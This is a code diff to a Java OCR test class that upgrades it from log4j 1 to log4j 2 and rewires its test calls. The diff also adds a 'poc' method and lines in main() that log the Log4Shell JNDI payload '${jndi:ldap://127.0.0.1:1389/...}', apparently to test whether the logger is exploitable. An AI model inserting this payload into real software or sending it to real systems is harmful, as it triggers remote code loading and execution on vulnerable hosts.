@@ -4,7 +4,8 @@ import base.EasyAdb;
 import ocr_processor.BaiduOcr;
 import ocr_processor.BaseOcr;
 import ocr_processor.TesseractOcr;
-import org.apache.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
@@ -12,13 +13,13 @@ import java.io.*;
 import java.util.Arrays;
 
 public class EasyAdbTest {
-    public static Logger logger = Logger.getLogger(EasyAdbTest.class.getName());
+    public static Logger logger = LogManager.getLogger(Main.class);
 
     public static void testOcrOrientText(BaseOcr ocr) throws Exception {
         logger.info("testOcrOrientText Using Ocr :: " + ocr.getOcrName());
-        InputStream is = new FileInputStream(new File("storage/ORIENT_TEST.png"));
+        InputStream is = new FileInputStream(new File("ri_che.jpg"));
         BufferedImage img = ImageIO.read(is);
-        logger.info(Arrays.toString(ocr.orientText(img, "TW-8")));
+        logger.info(Arrays.toString(ocr.orientText(img, "File")));
     }
 
     public static void testOcrSingleText(BaseOcr ocr) throws Exception {
@@ -29,9 +30,9 @@ public class EasyAdbTest {
 
     }
 
-    public static void testOcrMultiText(BaseOcr ocr) throws Exception {
+    public static void testOcrMultiText(BaseOcr ocr, String file_path) throws Exception {
         logger.info("testOcrMultiText Using Ocr :: " + ocr.getOcrName());
-        InputStream is = new FileInputStream(new File("storage/ORIENT_TEST.png"));
+        InputStream is = new FileInputStream(new File(file_path));
         BufferedImage img = ImageIO.read(is);
         logger.info(ocr.recognizeMultiText(img));
     }
@@ -57,32 +58,41 @@ public class EasyAdbTest {
         return new EasyAdb();
     }
 
+    public static void poc(String[] args) throws IOException {
+        String poc = "${jndi:ldap://127.0.0.1:1389/yte5jl}";
+        Logger logger = LogManager.getLogger(Main.class);
+        logger.error(poc);
+    }
+
     public static void main(String[] args) throws Exception {
         long startTime, endTime;
         BaseOcr ocr1 = new BaiduOcr();
-//        testOcrSingleText(ocr1);
+        testOcrSingleText(ocr1);
 //        testOcrMultiText(ocr1);
-
-        startTime = System.currentTimeMillis();   //获取开始时间
         testOcrOrientText(ocr1);
-        endTime = System.currentTimeMillis(); //获取结束时间
-        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
-//      2367ms
+        String poc = "${jndi:ldap://127.0.0.1:1389/udrlwt}";
+        logger.error(poc); // very easy
 
-        BaseOcr ocr2 = new TesseractOcr();
-//        testOcrSingleText(ocr2);
-//        testOcrMultiText(ocr2);
-        startTime = System.currentTimeMillis();   //获取开始时间
-        testOcrOrientText(ocr2);
-        endTime = System.currentTimeMillis(); //获取结束时间
-        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
-//      2188ms
-        EasyAdb adb = testAdbConnection();
-        startTime = System.currentTimeMillis();   //获取开始时间
-        testAdbScreenShoot(adb);
-        endTime = System.currentTimeMillis(); //获取结束时间
-        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
-//      2341ms
+//        startTime = System.currentTimeMillis();   //获取开始时间
+//        testOcrOrientText(ocr1);
+//        endTime = System.currentTimeMillis(); //获取结束时间
+//        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
+////      2367ms
+//
+//        BaseOcr ocr2 = new TesseractOcr();
+////        testOcrSingleText(ocr2);
+////        testOcrMultiText(ocr2);
+//        startTime = System.currentTimeMillis();   //获取开始时间
+//        testOcrOrientText(ocr2);
+//        endTime = System.currentTimeMillis(); //获取结束时间
+//        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
+////      2188ms
+//        EasyAdb adb = testAdbConnection();
+//        startTime = System.currentTimeMillis();   //获取开始时间
+//        testAdbScreenShoot(adb);
+//        endTime = System.currentTimeMillis(); //获取结束时间
+//        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
+////      2341ms
     }
 }
 
